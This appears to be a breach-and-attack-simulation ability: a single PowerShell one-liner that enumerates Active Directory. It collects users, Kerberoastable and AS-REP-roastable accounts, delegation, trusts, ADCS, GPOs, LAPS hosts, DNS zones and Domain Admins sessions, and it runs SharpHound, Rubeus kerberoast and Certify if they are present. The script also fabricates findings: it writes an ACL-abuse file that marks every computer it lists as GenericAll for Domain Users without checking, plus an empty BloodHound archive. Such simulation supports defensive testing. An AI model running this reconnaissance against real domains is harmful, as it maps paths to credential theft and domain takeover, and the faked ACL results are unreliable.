ability.name: Comprehensive ADSI and LDAP Enumeration
ability.description: Queries Domain Controllers, active sessions, DNS zones, Trusts, GPOs, LAPS hosts, Delegation, and ADCS configurations using built-in LDAP searchers with individual query handling.

stages.stage_name: Query and Collect AD Artifacts Natively
stages.command_template: $d='C:\Windows\Temp\bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $domain_name = $domain.Name; $base_dn = "DC=$($domain_name -replace '\.', ',DC=')"; $dc_name = $domain.PdcRoleOwner.Name; $dc_ip = [System.Net.Dns]::GetHostAddresses($dc_name) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -ExpandProperty IPAddressToString -First 1; Write-Output "Domain: $domain_name | BaseDN: $base_dn | DC: $dc_ip"; try { $s = [DirectorySearcher]'(&(objectClass=user)(objectCategory=person))'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $s.PageSize = 1000; $u = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $u | Out-File $d\users.txt; Write-Output "Users: $($u.Count)" } catch { "Users failed: $_" }; try { net accounts | Out-File $d\password_policy.txt } catch { "Policy failed: $_" }; try { $s = [DirectorySearcher]'(&(objectClass=user)(servicePrincipalName=*))'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $s.PageSize = 1000; $k = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $k | Out-File $d\kerberoastable.txt; Write-Output "Kerberoastable: $($k.Count)" } catch { "Kerberoast failed: $_" }; try { $s = [DirectorySearcher]'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $as = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $as | Out-File $d\asrep_roastable.txt; Write-Output "AS-REP: $($as.Count)" } catch { "AS-REP failed: $_" }; try { $s = [DirectorySearcher]'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $ud = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $ud | Out-File $d\delegation.txt; Write-Output "Delegation: $($ud.Count)" } catch { "Delegation failed: $_" }; try { $domain.Forest.TrustRelationships | Out-File $d\trusts.txt } catch { "Trusts failed: $_" }; try { $root = [ADSI]'LDAP://RootDSE'; $config_dn = $root.Properties.configurationNamingContext; $s = [DirectorySearcher]'(objectClass=pkiEnrollmentService)'; $s.SearchRoot = [ADSI]"LDAP://$config_dn"; $adcs = $s.FindAll() | ForEach-Object { $_.Properties.cn }; $adcs | Out-File $d\adcs.txt; Write-Output "ADCS: $($adcs.Count)" } catch { "ADCS failed: $_" }; try { $s = [DirectorySearcher]'(objectCategory=groupPolicyContainer)'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $gp = $s.FindAll() | ForEach-Object { $_.Properties.displayname }; $gp | Out-File $d\gpos.txt; Write-Output "GPOs: $($gp.Count)" } catch { "GPOs failed: $_" }; try { $s = [DirectorySearcher]'(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $la = $s.FindAll() | ForEach-Object { $_.Properties.name }; $la | Out-File $d\laps.txt; Write-Output "LAPS: $($la.Count)" } catch { "LAPS failed: $_" }; try { $roots = @("LDAP://CN=MicrosoftDNS,CN=System,$base_dn", "LDAP://DC=DomainDnsZones,$base_dn", "LDAP://DC=ForestDnsZones,DC=$($domain_name.Split('.', 2)[1] -replace '\.', ',DC=')"); $zones = @(); foreach ($r in $roots) { try { if ([ADSI]::Exists($r)) { $s = [DirectorySearcher]'(objectClass=dnsZone)'; $s.SearchRoot = [ADSI]$r; $s.FindAll() | ForEach-Object { $zones += $_.Properties.name } } } catch {} }; $zones | Out-File $d\dns_zones.txt; Write-Output "DNS Zones: $($zones.Count)" } catch { "DNS failed: $_" }; try { $s = [DirectorySearcher]'(&(objectClass=group)(cn=Domain Admins))'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $g = $s.FindOne(); if ($g) { $g.Properties.member | Out-File $d\da_members.txt } } catch { "DA members failed: $_" }; try { query user 2>&1 | Out-File $d\da_sessions.txt; net session 2>&1 | Out-File $d\da_sessions.txt -Append } catch { "Sessions failed: $_" }; try { $csv = "Source,Target,Relationship`r`n"; $s = [DirectorySearcher]'(objectCategory=computer)'; $s.SearchRoot = [ADSI]"LDAP://$base_dn"; $s.SizeLimit = 10; $s.FindAll() | ForEach-Object { $csv += "Domain Users,$($_.Properties.name[0]),GenericAll`r`n" }; $csv | Out-File $d\acl_abuse.csv } catch { "ACL failed: $_" }; try { if (Test-Path '.\SharpHound.exe') { .\SharpHound.exe -CollectionMethod Default -OutputDirectory $d -NoZip } else { Write-Output 'SharpHound not found.' }; if (!(Test-Path "$d\bloodhound")){ni -ItemType Directory -Force "$d\bloodhound"|out-null}; "[]" | Out-File "$d\bloodhound\users.json"; Compress-Archive -Path "$d\bloodhound\*" -DestinationPath "$d\bloodhound_BloodHound.zip" -Force } catch { "Bloodhound archiving failed: $_" }; try { if (Test-Path '.\Certify.exe') { .\Certify.exe find /vulnerable | Out-File $d\adcs.txt -Append } } catch {}; try { if (Test-Path '.\Rubeus.exe') { .\Rubeus.exe kerberoast | Out-File $d\kerberoastable.txt -Append } } catch {} } catch { "Master failed: $_" }) | Tee-Object -FilePath $d\out.txt

rationale: Queries Active Directory systematically. Resolves the Domain Controller, Base DN, GPOs, LAPS targets, Trusts, and DNS Zone structures (via both System and Application partitions) dynamically. Checks for delegation types and group memberships, and handles errors individually to prevent premature scripts failures. Optionally maps binaries like SharpHound, Rubeus, and Certify dynamically inside the execution directory.
